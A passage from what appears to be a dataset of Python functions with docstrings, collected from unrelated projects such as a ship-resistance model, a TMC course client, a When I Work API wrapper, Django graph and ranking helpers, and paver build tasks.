            "def dimension(self, length, draught, beam, speed,\n                 slenderness_coefficient, prismatic_coefficient):\n        \"\"\"\n        Assign values for the main dimension of a ship.\n\n        :param length: metres length of the vehicle\n        :param draught: metres draught of the vehicle\n        :param beam: metres beam of the vehicle\n        :param speed: m/s speed of the vehicle\n        :param slenderness_coefficient: Slenderness coefficient dimensionless :math:`L/(\u2207^{1/3})` where L is length of ship,\n            \u2207 is displacement\n        :param prismatic_coefficient: Prismatic coefficient dimensionless :math:`\u2207/(L\\cdot A_m)` where L is length of ship,\n            \u2207 is displacement Am is midsection area of the ship\n        \"\"\"\n        self.length = length\n        self.draught = draught\n        self.beam = beam\n        self.speed = speed\n        self.slenderness_coefficient = slenderness_coefficient\n        self.prismatic_coefficient = prismatic_coefficient\n        self.displacement = (self.length / self.slenderness_coefficient) ** 3\n        self.surface_area = 1.025 * (1.7 * self.length * self.draught +\n                                     self.displacement / self.draught)"
        ],
        [
            "def resistance(self):\n        \"\"\"\n        Return resistance of the vehicle.\n\n        :return: newton the resistance of the ship\n        \"\"\"\n        self.total_resistance_coef = frictional_resistance_coef(self.length, self.speed) + \\\n                                residual_resistance_coef(self.slenderness_coefficient,\n                                                         self.prismatic_coefficient,\n                                                         froude_number(self.speed, self.length))\n        RT = 1 / 2 * self.total_resistance_coef * 1025 * self.surface_area * self.speed ** 2\n        return RT"
        ],
        [
            "def maximum_deck_area(self, water_plane_coef=0.88):\n        \"\"\"\n        Return the maximum deck area of the ship\n\n        :param water_plane_coef: optional water plane coefficient\n        :return: Area of the deck\n        \"\"\"\n        AD = self.beam * self.length * water_plane_coef\n        return AD"
        ],
        [
            "def prop_power(self, propulsion_eff=0.7, sea_margin=0.2):\n        \"\"\"\n        Total propulsion power of the ship.\n\n        :param propulsion_eff: Shaft efficiency of the ship\n        :param sea_margin: Sea margin take account of interaction between ship and the sea, e.g. wave\n        :return: Watts shaft propulsion power of the ship\n        \"\"\"\n        PP = (1 + sea_margin) * self.resistance() * self.speed/propulsion_eff\n        return PP"
        ],
        [
            "def configure(self, url=None, token=None, test=False):\n        \"\"\"\n        Configure the api to use given url and token or to get them from the\n        Config.\n        \"\"\"\n\n        if url is None:\n            url = Config.get_value(\"url\")\n        if token is None:\n            token = Config.get_value(\"token\")\n\n        self.server_url = url\n        self.auth_header = {\"Authorization\": \"Basic {0}\".format(token)}\n        self.configured = True\n\n        if test:\n            self.test_connection()\n\n        Config.set(\"url\", url)\n        Config.set(\"token\", token)"
        ],
        [
            "def send_zip(self, exercise, file, params):\n        \"\"\"\n        Send zipfile to TMC for given exercise\n        \"\"\"\n\n        resp = self.post(\n            exercise.return_url,\n            params=params,\n            files={\n                \"submission[file]\": ('submission.zip', file)\n            },\n            data={\n                \"commit\": \"Submit\"\n            }\n        )\n        return self._to_json(resp)"
        ],
        [
            "def _make_url(self, slug):\n        \"\"\"\n        Ensures that the request url is valid.\n        Sometimes we have URLs that the server gives that are preformatted,\n        sometimes we need to form our own.\n        \"\"\"\n        if slug.startswith(\"http\"):\n            return slug\n        return \"{0}{1}\".format(self.server_url, slug)"
        ],
        [
            "def _to_json(self, resp):\n        \"\"\"\n            Extract json from a response.\n            Assumes response is valid otherwise.\n            Internal use only.\n        \"\"\"\n        try:\n            json = resp.json()\n        except ValueError as e:\n            reason = \"TMC Server did not send valid JSON: {0}\"\n            raise APIError(reason.format(repr(e)))\n\n        return json"
        ],
        [
            "def safe_joinall(greenlets, timeout=None, raise_error=False):\n    \"\"\"\n    Wrapper for gevent.joinall if the greenlet that waits for the joins is killed, it kills all the greenlets it\n    joins for.\n    \"\"\"\n    greenlets = list(greenlets)\n    try:\n        gevent.joinall(greenlets, timeout=timeout, raise_error=raise_error)\n    except gevent.GreenletExit:\n        [greenlet.kill() for greenlet in greenlets if not greenlet.ready()]\n        raise\n    return greenlets"
        ],
        [
            "def error(code: int, *args, **kwargs) -> HedgehogCommandError:\n    \"\"\"\n    Creates an error from the given code, and args and kwargs.\n\n    :param code: The acknowledgement code\n    :param args: Exception args\n    :param kwargs: Exception kwargs\n    :return: the error for the given acknowledgement code\n    \"\"\"\n    # TODO add proper error code\n    if code == FAILED_COMMAND and len(args) >= 1 and args[0] == \"Emergency Shutdown activated\":\n        return EmergencyShutdown(*args, **kwargs)\n    return _errors[code](*args, **kwargs)"
        ],
        [
            "def to_message(self):\n        \"\"\"\n        Creates an error Acknowledgement message.\n        The message's code and message are taken from this exception.\n\n        :return: the message representing this exception\n        \"\"\"\n        from .messages import ack\n        return ack.Acknowledgement(self.code, self.args[0] if len(self.args) > 0 else '')"
        ],
        [
            "def clean(options, info):\n    \"\"\"Clean up extra files littering the source tree.\n\n    options.paved.clean.dirs: directories to search recursively\n    options.paved.clean.patterns: patterns to search for and remove\n    \"\"\"\n    info(\"Cleaning patterns %s\", options.paved.clean.patterns)\n    for wd in options.paved.clean.dirs:\n        info(\"Cleaning in %s\", wd)\n        for p in options.paved.clean.patterns:\n            for f in wd.walkfiles(p):\n                f.remove()"
        ],
        [
            "def printoptions():\n    '''print paver options.\n\n    Prettified by json.\n    `long_description` is removed\n    '''\n    x = json.dumps(environment.options,\n                   indent=4,\n                   sort_keys=True,\n                   skipkeys=True,\n                   cls=MyEncoder)\n    print(x)"
        ],
        [
            "def parse(self, data: RawMessage) -> Message:\n        \"\"\"\\\n        Parses a binary protobuf message into a Message object.\n        \"\"\"\n        try:\n            return self.receiver.parse(data)\n        except KeyError as err:\n            raise UnknownCommandError from err\n        except DecodeError as err:\n            raise UnknownCommandError(f\"{err}\") from err"
        ],
        [
            "def add_child(self, **kwargs):\n        \"\"\"Creates a new ``Node`` based on the extending class and adds it as\n        a child to this ``Node``.\n\n        :param kwargs: \n            arguments for constructing the data object associated with this\n            ``Node``\n        :returns: \n            extender of the ``Node`` class\n        \"\"\"\n        data_class = self.graph.data_content_type.model_class()\n        node = Node.objects.create(graph=self.graph)\n        data_class.objects.create(node=node, **kwargs)\n        node.parents.add(self)\n        self.children.add(node)\n        return node"
        ],
        [
            "def ancestors(self):\n        \"\"\"Returns a list of the ancestors of this node.\"\"\"\n        ancestors = set([])\n        self._depth_ascend(self, ancestors)\n        try:\n            ancestors.remove(self)\n        except KeyError:\n            # we weren't ancestor of ourself, that's ok\n            pass\n\n        return list(ancestors)"
        ],
        [
            "def ancestors_root(self):\n        \"\"\"Returns a list of the ancestors of this node but does not pass the\n        root node, even if the root has parents due to cycles.\"\"\"\n        if self.is_root():\n            return []\n\n        ancestors = set([])\n        self._depth_ascend(self, ancestors, True)\n        try:\n            ancestors.remove(self)\n        except KeyError:\n            # we weren't ancestor of ourself, that's ok\n            pass\n\n        return list(ancestors)"
        ],
        [
            "def descendents(self):\n        \"\"\"Returns a list of descendents of this node.\"\"\"\n        visited = set([])\n        self._depth_descend(self, visited)\n        try:\n            visited.remove(self)\n        except KeyError:\n            # we weren't descendent of ourself, that's ok\n            pass\n\n        return list(visited)"
        ],
        [
            "def can_remove(self):\n        \"\"\"Returns True if it is legal to remove this node and still leave the\n        graph as a single connected entity, not splitting it into a forest.\n        Only nodes with no children or those who cause a cycle can be deleted.\n        \"\"\"\n        if self.children.count() == 0:\n            return True\n\n        ancestors = set(self.ancestors_root())\n        children = set(self.children.all())\n        return children.issubset(ancestors)"
        ],
        [
            "def prune(self):\n        \"\"\"Removes the node and all descendents without looping back past the\n        root.  Note this does not remove the associated data objects.\n\n        :returns:\n            list of :class:`BaseDataNode` subclassers associated with the\n            removed ``Node`` objects.\n        \"\"\"\n        targets = self.descendents_root()\n        try:\n            targets.remove(self.graph.root)\n        except ValueError:\n            # root wasn't in the target list, no problem\n            pass\n\n        results = [n.data for n in targets]\n        results.append(self.data)\n        for node in targets:\n            node.delete()\n\n        for parent in self.parents.all():\n            parent.children.remove(self)\n\n        self.delete()\n        return results"
        ],
        [
            "def prune_list(self):\n        \"\"\"Returns a list of nodes that would be removed if prune were called\n        on this element.\n        \"\"\"\n        targets = self.descendents_root()\n        try:\n            targets.remove(self.graph.root)\n        except ValueError:\n            # root wasn't in the target list, no problem\n            pass\n\n        targets.append(self)\n        return targets"
        ],
        [
            "def _child_allowed(self, child_rule):\n        \"\"\"Called to verify that the given rule can become a child of the\n        current node.  \n\n        :raises AttributeError: \n            if the child is not allowed\n        \"\"\"\n        num_kids = self.node.children.count()\n        num_kids_allowed = len(self.rule.children)\n        if not self.rule.multiple_paths:\n            num_kids_allowed = 1\n\n        if num_kids >= num_kids_allowed:\n            raise AttributeError('Rule %s only allows %s children' % (\n                self.rule_name, self.num_kids_allowed))\n\n        # verify not a duplicate\n        for node in self.node.children.all():\n            if node.data.rule_label == child_rule.class_label:\n                raise AttributeError('Child rule already exists')\n\n        # check if the given rule is allowed as a child\n        if child_rule not in self.rule.children:\n            raise AttributeError('Rule %s is not a valid child of Rule %s' % (\n                child_rule.__name__, self.rule_name))"
        ],
        [
            "def get_location(self, location_id):\n        \"\"\"\n        Returns location data.\n\n        http://dev.wheniwork.com/#get-existing-location\n        \"\"\"\n        url = \"/2/locations/%s\" % location_id\n\n        return self.location_from_json(self._get_resource(url)[\"location\"])"
        ],
        [
            "def get_locations(self):\n        \"\"\"\n        Returns a list of locations.\n\n        http://dev.wheniwork.com/#listing-locations\n        \"\"\"\n        url = \"/2/locations\"\n\n        data = self._get_resource(url)\n        locations = []\n        for entry in data['locations']:\n            locations.append(self.location_from_json(entry))\n\n        return locations"
        ],
        [
            "def chisq_red(self):\n        \"\"\"\n        The reduced chi-square of the linear least squares\n        \"\"\"\n        if self._chisq_red is None:\n            self._chisq_red = chisquare(self.y_unweighted.transpose(), _np.dot(self.X_unweighted, self.beta), self.y_error, ddof=3, verbose=False)\n        return self._chisq_red"
        ],
        [
            "def create(self, server):\n        \"\"\"Create the task on the server\"\"\"\n        if len(self.geometries) == 0:\n            raise Exception('no geometries')\n        return server.post(\n            'task_admin',\n            self.as_payload(),\n            replacements={\n                'slug': self.__challenge__.slug,\n                'identifier': self.identifier})"
        ],
        [
            "def update(self, server):\n        \"\"\"Update existing task on the server\"\"\"\n        return server.put(\n            'task_admin',\n            self.as_payload(),\n            replacements={\n                'slug': self.__challenge__.slug,\n                'identifier': self.identifier})"
        ],
        [
            "def from_server(cls, server, slug, identifier):\n        \"\"\"Retrieve a task from the server\"\"\"\n        task = server.get(\n            'task',\n            replacements={\n                'slug': slug,\n                'identifier': identifier})\n        return cls(**task)"
        ],
        [
            "def formatter(color, s):\n    \"\"\" Formats a string with color \"\"\"\n    if no_coloring:\n        return s\n    return \"{begin}{s}{reset}\".format(begin=color, s=s, reset=Colors.RESET)"
        ],
        [
            "def get_user(self, user_id):\n        \"\"\"\n        Returns user profile data.\n\n        http://dev.wheniwork.com/#get-existing-user\n        \"\"\"\n        url = \"/2/users/%s\" % user_id\n\n        return self.user_from_json(self._get_resource(url)[\"user\"])"
        ],
        [
            "def get_users(self, params={}):\n        \"\"\"\n        Returns a list of users.\n\n        http://dev.wheniwork.com/#listing-users\n        \"\"\"\n        param_list = [(k, params[k]) for k in sorted(params)]\n        url = \"/2/users/?%s\" % urlencode(param_list)\n\n        data = self._get_resource(url)\n        users = []\n        for entry in data[\"users\"]:\n            users.append(self.user_from_json(entry))\n\n        return users"
        ],
        [
            "def _setVirtualEnv():\n    \"\"\"Attempt to set the virtualenv activate command, if it hasn't been specified.\n    \"\"\"\n    try:\n        activate = options.virtualenv.activate_cmd\n    except AttributeError:\n        activate = None\n\n    if activate is None:\n        virtualenv = path(os.environ.get('VIRTUAL_ENV', ''))\n        if not virtualenv:\n            virtualenv = options.paved.cwd\n        else:\n            virtualenv = path(virtualenv)\n\n        activate = virtualenv / 'bin' / 'activate'\n\n        if activate.exists():\n            info('Using default virtualenv at %s' % activate)\n            options.setdotted('virtualenv.activate_cmd', 'source %s' % activate)"
        ],
        [
            "def update(dst, src):\n    \"\"\"Recursively update the destination dict-like object with the source dict-like object.\n\n    Useful for merging options and Bunches together!\n\n    Based on:\n    http://code.activestate.com/recipes/499335-recursively-update-a-dictionary-without-hitting-py/#c1\n    \"\"\"\n    stack = [(dst, src)]\n\n    def isdict(o):\n        return hasattr(o, 'keys')\n\n    while stack:\n        current_dst, current_src = stack.pop()\n        for key in current_src:\n            if key not in current_dst:\n                current_dst[key] = current_src[key]\n            else:\n                if isdict(current_src[key]) and isdict(current_dst[key]):\n                    stack.append((current_dst[key], current_src[key]))\n                else:\n                    current_dst[key] = current_src[key]\n    return dst"
        ],
        [
            "def pip_install(*args):\n    \"\"\"Send the given arguments to `pip install`.\n    \"\"\"\n    download_cache = ('--download-cache=%s ' % options.paved.pip.download_cache) if options.paved.pip.download_cache else ''\n    shv('pip install %s%s' % (download_cache, ' '.join(args)))"
        ],
        [
            "def _get_resource(self, url, data_key=None):\n        \"\"\"\n        When I Work GET method. Return representation of the requested\n        resource.\n        \"\"\"\n        headers = {\"Accept\": \"application/json\"}\n        if self.token:\n            headers[\"W-Token\"] = \"%s\" % self.token\n        response = WhenIWork_DAO().getURL(url, headers)\n\n        if response.status != 200:\n            raise DataFailureException(url, response.status, response.data)\n\n        return json.loads(response.data)"
        ],
        [
            "def _put_resource(self, url, body):\n        \"\"\"\n        When I Work PUT method.\n        \"\"\"\n        headers = {\"Content-Type\": \"application/json\",\n                   \"Accept\": \"application/json\"}\n        if self.token:\n            headers[\"W-Token\"] = \"%s\" % self.token\n        response = WhenIWork_DAO().putURL(url, headers, json.dumps(body))\n\n        if not (response.status == 200 or response.status == 201 or\n                response.status == 204):\n            raise DataFailureException(url, response.status, response.data)\n\n        return json.loads(response.data)"
        ],
        [
            "def _post_resource(self, url, body):\n        \"\"\"\n        When I Work POST method.\n        \"\"\"\n        headers = {\"Content-Type\": \"application/json\",\n                   \"Accept\": \"application/json\"}\n        if self.token:\n            headers[\"W-Token\"] = \"%s\" % self.token\n        response = WhenIWork_DAO().postURL(url, headers, json.dumps(body))\n\n        if not (response.status == 200 or response.status == 204):\n            raise DataFailureException(url, response.status, response.data)\n\n        return json.loads(response.data)"
        ],
        [
            "def _delete_resource(self, url):\n        \"\"\"\n        When I Work DELETE method.\n        \"\"\"\n        headers = {\"Content-Type\": \"application/json\",\n                   \"Accept\": \"application/json\"}\n        if self.token:\n            headers[\"W-Token\"] = \"%s\" % self.token\n        response = WhenIWork_DAO().deleteURL(url, headers)\n\n        if not (response.status == 200 or response.status == 201 or\n                response.status == 204):\n            raise DataFailureException(url, response.status, response.data)\n\n        return json.loads(response.data)"
        ],
        [
            "def create_shift(self, params={}):\n        \"\"\"\n        Creates a shift\n\n        http://dev.wheniwork.com/#create/update-shift\n        \"\"\"\n        url = \"/2/shifts/\"\n        body = params\n\n        data = self._post_resource(url, body)\n        shift = self.shift_from_json(data[\"shift\"])\n\n        return shift"
        ],
        [
            "def delete_shifts(self, shifts):\n        \"\"\"\n        Delete existing shifts.\n\n        http://dev.wheniwork.com/#delete-shift\n        \"\"\"\n        url = \"/2/shifts/?%s\" % urlencode(\n            {'ids': \",\".join(str(s) for s in shifts)})\n\n        data = self._delete_resource(url)\n\n        return data"
        ],
        [
            "def all_comments(self):\n        \"\"\"\n        Returns combined list of event and update comments.\n        \"\"\"\n        ctype = ContentType.objects.get(app_label__exact=\"happenings\", model__exact='event')\n        update_ctype = ContentType.objects.get(app_label__exact=\"happenings\", model__exact='update')\n        update_ids = self.update_set.values_list('id', flat=True)\n\n        return Comment.objects.filter(\n            Q(content_type=ctype.id, object_pk=self.id) |\n            Q(content_type=update_ctype.id, object_pk__in=update_ids)\n        )"
        ],
        [
            "def get_all_images(self):\n        \"\"\"\n        Returns chained list of event and update images.\n        \"\"\"\n        self_imgs = self.image_set.all()\n        update_ids = self.update_set.values_list('id', flat=True)\n        u_images = UpdateImage.objects.filter(update__id__in=update_ids)\n\n        return list(chain(self_imgs, u_images))"
        ],
        [
            "def get_all_images_count(self):\n        \"\"\"\n        Gets count of all images from both event and updates.\n        \"\"\"\n        self_imgs = self.image_set.count()\n        update_ids = self.update_set.values_list('id', flat=True)\n        u_images = UpdateImage.objects.filter(update__id__in=update_ids).count()\n        count = self_imgs + u_images\n\n        return count"
        ],
        [
            "def get_top_assets(self):\n        \"\"\"\n        Gets images and videos to populate top assets.\n\n        Map is built separately.\n        \"\"\"\n        images = self.get_all_images()[0:14]\n        video = []\n        if supports_video:\n            video = self.eventvideo_set.all()[0:10]\n\n        return list(chain(images, video))[0:15]"
        ],
        [
            "def decorate(msg=\"\", waitmsg=\"Please wait\"):\n        \"\"\"\n        Decorated methods progress will be displayed to the user as a spinner.\n        Mostly for slower functions that do some network IO.\n        \"\"\"\n        def decorator(func):\n            @functools.wraps(func)\n            def wrapper(*args, **kwargs):\n                spin = Spinner(msg=msg, waitmsg=waitmsg)\n                spin.start()\n                a = None\n                try:\n                    a = func(*args, **kwargs)\n                except Exception as e:\n                    spin.msg = \"Something went wrong: \"\n                    spin.stop_spinning()\n                    spin.join()\n                    raise e\n                spin.stop_spinning()\n                spin.join()\n                return a\n\n            return wrapper\n\n        return decorator"
        ],
        [
            "def launch(title, items, selected=None):\n        \"\"\"\n        Launches a new menu. Wraps curses nicely so exceptions won't screw with\n        the terminal too much.\n        \"\"\"\n        resp = {\"code\": -1, \"done\": False}\n        curses.wrapper(Menu, title, items, selected, resp)\n        return resp"
        ],
        [
            "def save(self, *args, **kwargs):\n        \"\"\"Overridden method that handles that re-ranking of objects and the\n        integrity of the ``rank`` field.\n\n        :param rerank:\n            Added parameter, if True will rerank other objects based on the\n            change in this save.  Defaults to True.  \n        \"\"\"\n        rerank = kwargs.pop('rerank', True)\n        if rerank:\n            if not self.id:\n                self._process_new_rank_obj()\n            elif self.rank == self._rank_at_load:\n                # nothing changed\n                pass\n            else:\n                self._process_moved_rank_obj()\n\n        super(RankedModel, self).save(*args, **kwargs)"
        ],
        [
            "def repack(self):\n        \"\"\"Removes any blank ranks in the order.\"\"\"\n        items = self.grouped_filter().order_by('rank').select_for_update()\n        for count, item in enumerate(items):\n            item.rank = count + 1\n            item.save(rerank=False)"
        ],
        [
            "def get_field_names(obj, ignore_auto=True, ignore_relations=True, \n        exclude=[]):\n    \"\"\"Returns the field names of a Django model object.\n\n    :param obj: the Django model class or object instance to get the fields\n        from\n    :param ignore_auto: ignore any fields of type AutoField. Defaults to True\n    :param ignore_relations: ignore any fields that involve relations such as\n        the ForeignKey or ManyToManyField\n    :param exclude: exclude anything in this list from the results\n\n    :returns: generator of found field names\n    \"\"\"\n\n    from django.db.models import (AutoField, ForeignKey, ManyToManyField, \n        ManyToOneRel, OneToOneField, OneToOneRel)\n\n    for field in obj._meta.get_fields():\n        if ignore_auto and isinstance(field, AutoField):\n            continue\n\n        if ignore_relations and (isinstance(field, ForeignKey) or\n                isinstance(field, ManyToManyField) or\n                isinstance(field, ManyToOneRel) or\n                isinstance(field, OneToOneRel) or\n                isinstance(field, OneToOneField)):\n            # optimization is killing coverage measure, have to put no-op that\n            # does something\n            a = 1; a\n            continue\n\n        if field.name in exclude:\n            continue\n\n        yield field.name"
        ],
        [
            "def register(\n        app):\n    \"\"\"\n    Register all HTTP error code error handlers\n\n    Currently, errors are handled by the JSON error handler.\n    \"\"\"\n\n    # Pick a handler based on the requested format. Currently we assume the\n    # caller wants JSON.\n    error_handler = json.http_exception_error_handler\n\n\n    @app.errorhandler(400)\n    def handle_bad_request(\n            exception):\n        return error_handler(exception)\n\n\n    @app.errorhandler(404)\n    def handle_not_found(\n            exception):\n        return error_handler(exception)\n\n\n    @app.errorhandler(405)\n    def handle_method_not_allowed(\n            exception):\n        return error_handler(exception)\n\n\n    @app.errorhandler(422)\n    def handle_unprocessable_entity(\n            exception):\n        return error_handler(exception)\n\n\n    @app.errorhandler(500)\n    def handle_internal_server_error(\n            exception):\n        return error_handler(exception)"
        ],
        [
            "def plot(*args, ax=None, **kwargs):\n    \"\"\"\n    Plots but automatically resizes x axis.\n\n    .. versionadded:: 1.4\n\n    Parameters\n    ----------\n    args\n        Passed on to :meth:`matplotlib.axis.Axis.plot`.\n    ax : :class:`matplotlib.axis.Axis`, optional\n        The axis to plot to.\n    kwargs\n        Passed on to :meth:`matplotlib.axis.Axis.plot`.\n\n    \"\"\"\n    if ax is None:\n        fig, ax = _setup_axes()\n\n    pl = ax.plot(*args, **kwargs)\n\n    if _np.shape(args)[0] > 1:\n        if type(args[1]) is not str:\n            min_x = min(args[0])\n            max_x = max(args[0])\n            ax.set_xlim((min_x, max_x))\n\n    return pl"
        ],
        [
            "def linspacestep(start, stop, step=1):\n    \"\"\"\n    Create a vector of values over an interval with a specified step size.\n\n    Parameters\n    ----------\n\n    start : float\n        The beginning of the interval.\n    stop : float\n        The end of the interval.\n    step : float\n        The step size.\n\n    Returns\n    -------\n    vector : :class:`numpy.ndarray`\n        The vector of values.\n    \"\"\"\n    # Find an integer number of steps\n    numsteps = _np.int((stop-start)/step)\n\n    # Do a linspace over the new range\n    # that has the correct endpoint\n    return _np.linspace(start, start+step*numsteps, numsteps+1)"
        ],
        [
            "def selected_course(func):\n    \"\"\"\n    Passes the selected course as the first argument to func.\n    \"\"\"\n    @wraps(func)\n    def inner(*args, **kwargs):\n        course = Course.get_selected()\n        return func(course, *args, **kwargs)\n    return inner"
        ],
        [
            "def selected_exercise(func):\n    \"\"\"\n    Passes the selected exercise as the first argument to func.\n    \"\"\"\n    @wraps(func)\n    def inner(*args, **kwargs):\n        exercise = Exercise.get_selected()\n        return func(exercise, *args, **kwargs)\n    return inner"
        ],
        [
            "def false_exit(func):\n    \"\"\"\n    If func returns False the program exits immediately.\n    \"\"\"\n    @wraps(func)\n    def inner(*args, **kwargs):\n        ret = func(*args, **kwargs)\n        if ret is False:\n            if \"TMC_TESTING\" in os.environ:\n                raise TMCExit()\n            else:\n                sys.exit(-1)\n        return ret\n    return inner"
        ],
        [
            "def configure(server=None, username=None, password=None, tid=None, auto=False):\n    \"\"\"\n    Configure tmc.py to use your account.\n    \"\"\"\n    if not server and not username and not password and not tid:\n        if Config.has():\n            if not yn_prompt(\"Override old configuration\", False):\n                return False\n    reset_db()\n    if not server:\n        while True:\n            server = input(\"Server url [https://tmc.mooc.fi/mooc/]: \").strip()\n            if len(server) == 0:\n                server = \"https://tmc.mooc.fi/mooc/\"\n            if not server.endswith('/'):\n                server += '/'\n            if not (server.startswith(\"http://\")\n                    or server.startswith(\"https://\")):\n                ret = custom_prompt(\n                    \"Server should start with http:// or https://\\n\" +\n                    \"R: Retry, H: Assume http://, S: Assume https://\",\n                    [\"r\", \"h\", \"s\"], \"r\")\n                if ret == \"r\":\n                    continue\n                # Strip previous schema\n                if \"://\" in server:\n                    server = server.split(\"://\")[1]\n                if ret == \"h\":\n                    server = \"http://\" + server\n                elif ret == \"s\":\n                    server = \"https://\" + server\n            break\n\n        print(\"Using URL: '{0}'\".format(server))\n    while True:\n        if not username:\n            username = input(\"Username: \")\n        if not password:\n            password = getpass(\"Password: \")\n        # wow, such security\n        token = b64encode(\n            bytes(\"{0}:{1}\".format(username, password), encoding='utf-8')\n        ).decode(\"utf-8\")\n\n        try:\n            api.configure(url=server, token=token, test=True)\n        except APIError as e:\n            print(e)\n            if auto is False and yn_prompt(\"Retry authentication\"):\n                username = password = None\n                continue\n            return False\n        break\n    if tid:\n        select(course=True, tid=tid, auto=auto)\n    else:\n        select(course=True)"
        ],
        [
            "def download(course, tid=None, dl_all=False, force=False, upgradejava=False,\n             update=False):\n    \"\"\"\n    Download the exercises from the server.\n    \"\"\"\n\n    def dl(id):\n        download_exercise(Exercise.get(Exercise.tid == id),\n                          force=force,\n                          update_java=upgradejava,\n                          update=update)\n\n    if dl_all:\n        for exercise in list(course.exercises):\n            dl(exercise.tid)\n    elif tid is not None:\n        dl(int(tid))\n    else:\n        for exercise in list(course.exercises):\n            if not exercise.is_completed:\n                dl(exercise.tid)\n            else:\n                exercise.update_downloaded()"
        ],
        [
            "def skip(course, num=1):\n    \"\"\"\n    Go to the next exercise.\n    \"\"\"\n    sel = None\n    try:\n        sel = Exercise.get_selected()\n        if sel.course.tid != course.tid:\n            sel = None\n    except NoExerciseSelected:\n        pass\n\n    if sel is None:\n        sel = course.exercises.first()\n    else:\n        try:\n            sel = Exercise.get(Exercise.id == sel.id + num)\n        except peewee.DoesNotExist:\n            print(\"There are no more exercises in this course.\")\n            return False\n\n    sel.set_select()\n    list_all(single=sel)"
        ],
        [
            "def run(exercise, command):\n    \"\"\"\n    Spawns a process with `command path-of-exercise`\n    \"\"\"\n    Popen(['nohup', command, exercise.path()], stdout=DEVNULL, stderr=DEVNULL)"
        ],
        [
            "def select(course=False, tid=None, auto=False):\n    \"\"\"\n    Select a course or an exercise.\n    \"\"\"\n    if course:\n        update(course=True)\n        course = None\n        try:\n            course = Course.get_selected()\n        except NoCourseSelected:\n            pass\n\n        ret = {}\n        if not tid:\n            ret = Menu.launch(\"Select a course\",\n                              Course.select().execute(),\n                              course)\n        else:\n            ret[\"item\"] = Course.get(Course.tid == tid)\n        if \"item\" in ret:\n            ret[\"item\"].set_select()\n            update()\n            if ret[\"item\"].path == \"\":\n                select_a_path(auto=auto)\n            # Selects the first exercise in this course\n            skip()\n            return\n        else:\n            print(\"You can select the course with `tmc select --course`\")\n            return\n    else:\n        selected = None\n        try:\n            selected = Exercise.get_selected()\n        except NoExerciseSelected:\n            pass\n\n        ret = {}\n        if not tid:\n            ret = Menu.launch(\"Select an exercise\",\n                              Course.get_selected().exercises,\n                              selected)\n        else:\n            ret[\"item\"] = Exercise.byid(tid)\n        if \"item\" in ret:\n            ret[\"item\"].set_select()\n            print(\"Selected {}\".format(ret[\"item\"]))"
        ],
        [
            "def submit(course, tid=None, pastebin=False, review=False):\n    \"\"\"\n    Submit the selected exercise to the server.\n    \"\"\"\n    if tid is not None:\n        return submit_exercise(Exercise.byid(tid),\n                               pastebin=pastebin,\n                               request_review=review)\n    else:\n        sel = Exercise.get_selected()\n        if not sel:\n            raise NoExerciseSelected()\n        return submit_exercise(sel, pastebin=pastebin, request_review=review)"
        ],
        [
            "def paste(tid=None, review=False):\n    \"\"\"\n    Sends the selected exercise to the TMC pastebin.\n    \"\"\"\n    submit(pastebin=True, tid=tid, review=False)"
        ],
        [
            "def update(course=False):\n    \"\"\"\n    Update the data of courses and or exercises from server.\n    \"\"\"\n    if course:\n        with Spinner.context(msg=\"Updated course metadata.\",\n                             waitmsg=\"Updating course metadata.\"):\n            for course in api.get_courses():\n                old = None\n                try:\n                    old = Course.get(Course.tid == course[\"id\"])\n                except peewee.DoesNotExist:\n                    old = None\n                if old:\n                    old.details_url = course[\"details_url\"]\n                    old.save()\n                    continue\n                Course.create(tid=course[\"id\"], name=course[\"name\"],\n                              details_url=course[\"details_url\"])\n    else:\n        selected = Course.get_selected()\n\n        # with Spinner.context(msg=\"Updated exercise metadata.\",\n        #                     waitmsg=\"Updating exercise metadata.\"):\n        print(\"Updating exercise data.\")\n        for exercise in api.get_exercises(selected):\n            old = None\n            try:\n                old = Exercise.byid(exercise[\"id\"])\n            except peewee.DoesNotExist:\n                old = None\n            if old is not None:\n                old.name = exercise[\"name\"]\n                old.course = selected.id\n                old.is_attempted = exercise[\"attempted\"]\n                old.is_completed = exercise[\"completed\"]\n                old.deadline = exercise.get(\"deadline\")\n                old.is_downloaded = os.path.isdir(old.path())\n                old.return_url = exercise[\"return_url\"]\n                old.zip_url = exercise[\"zip_url\"]\n                old.submissions_url = exercise[\"exercise_submissions_url\"]\n                old.save()\n                download_exercise(old, update=True)\n            else:\n                ex = Exercise.create(tid=exercise[\"id\"],\n                                     name=exercise[\"name\"],\n                                     course=selected.id,\n                                     is_attempted=exercise[\"attempted\"],\n                                     is_completed=exercise[\"completed\"],\n                                     deadline=exercise.get(\"deadline\"),\n                                     return_url=exercise[\"return_url\"],\n                                     zip_url=exercise[\"zip_url\"],\n                                     submissions_url=exercise[(\"exercise_\"\n                                                               \"submissions_\"\n                                                               \"url\")])\n                ex.is_downloaded = os.path.isdir(ex.path())\n                ex.save()"
        ],
        [
            "def determine_type(x):\n    \"\"\"Determine the type of x\"\"\"\n    types = (int, float, str)\n    _type = filter(lambda a: is_type(a, x), types)[0]\n    return _type(x)"
        ],
        [
            "def dmap(fn, record):\n    \"\"\"map for a directory\"\"\"\n    values = (fn(v) for k, v in record.items())\n    return dict(itertools.izip(record, values))"
        ],
        [
            "def apply_types(use_types, guess_type, line):\n    \"\"\"Apply the types on the elements of the line\"\"\"\n    new_line = {}\n    for k, v in line.items():\n        if use_types.has_key(k):\n            new_line[k] = force_type(use_types[k], v)\n        elif guess_type:\n            new_line[k] = determine_type(v)\n        else:\n            new_line[k] = v\n    return new_line"
        ],
        [
            "def format_to_csv(filename, skiprows=0, delimiter=\"\"):\n    \"\"\"Convert a file to a .csv file\"\"\"\n    if not delimiter:\n        delimiter = \"\\t\"\n\n    input_file = open(filename, \"r\")\n\n    if skiprows:\n        [input_file.readline() for _ in range(skiprows)]\n \n    new_filename = os.path.splitext(filename)[0] + \".csv\"\n    output_file = open(new_filename, \"w\")\n\n    header = input_file.readline().split()\n    reader = csv.DictReader(input_file, fieldnames=header, delimiter=delimiter)\n    writer = csv.DictWriter(output_file, fieldnames=header, delimiter=\",\")\n    \n    # Write header\n    writer.writerow(dict((x, x) for x in header))\n    \n    # Write rows\n    for line in reader:\n        if None in line: del line[None]\n        writer.writerow(line)\n    \n    input_file.close()\n    output_file.close()\n    print \"Saved %s.\" % new_filename"
        ],
        [
